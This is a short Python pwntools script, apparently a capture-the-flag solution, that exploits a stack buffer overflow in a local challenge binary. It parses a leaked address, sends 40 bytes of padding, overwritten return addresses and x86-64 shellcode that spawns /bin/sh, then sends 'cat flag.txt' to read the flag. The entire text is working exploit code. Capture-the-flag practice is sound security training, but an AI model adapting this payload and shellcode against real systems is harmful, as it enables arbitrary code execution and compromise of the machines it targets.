from pwn import *

# conn = process('./challenge')
conn = process()

data = conn.recvline().decode().strip()
print(data)
ret_addr2 = int(data[-10:-2], 16)
ret_addr1 = int(data[-14:-10], 16)

print(hex(ret_addr1))
print(hex(ret_addr2))

ret_addr2 = p32(ret_addr2 + 48)
ret_addr1 = p32(ret_addr1)

shellcode64 = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload = b"A" * 40 + ret_addr2 + ret_addr1 + shellcode64 + b"\x00"

conn.send(payload)
conn.send(b"\n")

# Receive and print response
data = conn.recv(1024)
print("Feedback from server:", data)

# Send command to read flag
conn.send(b"cat flag.txt\n")

# Receive and print flag
data = conn.recv(1024)
print("Feedback from server:", data.decode())

# Close connection
conn.close()
